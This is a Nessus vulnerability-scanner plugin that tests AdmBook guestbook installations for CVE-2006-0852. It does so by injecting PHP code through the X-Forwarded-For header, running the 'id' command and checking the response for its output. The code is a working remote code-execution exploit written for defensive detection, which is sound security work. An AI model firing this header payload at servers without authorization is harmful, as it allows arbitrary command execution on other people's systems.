#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: rgod
#
# This script is released under the GNU GPLv2
# Special thanks to George
#

desc["english"] = "
Synopsis :

The remote web server contains a PHP script that allows arbitrary code
injection. 

Description:

The remote host is running AdmBook, a PHP-based guestbook. 

The remote version of this software is prone to remote PHP code
injection due to a lack of sanitization of the HTTP header
'X-Forwarded-For'.  Using a specially-crafted URL, a malicious user
can execute arbitrary command on the remote server subject to the
privileges of the web server user id. 

See also :

http://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl

Solution :

Unknown at this time. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
script_id(21080);
script_cve_id("CVE-2006-0852");
script_bugtraq_id(16753);
script_version("$Revision: 1.2 $");

name["english"] = "Admbook PHP Code Injection Flaw";
script_name(english:name["english"]);

script_description(english:desc["english"]);

summary["english"] = "Checks for remote PHP code injection in Admbook";
script_summary(english:summary["english"]);

script_category(ACT_DESTRUCTIVE_ATTACK);
script_copyright(english:"This script is Copyright (C) 2006 David Maciejak");

family["english"] = "CGI abuses";
script_family(english:family["english"]);

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/admbook", "/guestbook", "/gb", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  cmd = "id";
  magic = rand_str();

  req = http_get(
    item:string(
      dir, "/write.php?",
      "name=nessus&",
      "email=nessus@", this_host(), "&",
      "message=", urlencode(str:string("Nessus ran ", SCRIPT_NAME, " at ", unixtime()))
    ),
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      'X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  # nb: there won't necessarily be any output from the first request.

  req = http_get(item:string(dir, "/content-data.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "It was possible to execute the command '", cmd, "' on the remote\n",
      "host, which produces the following output :\n",
      "\n",
      output
    );

    security_hole(port:port, data:report);
  }
}
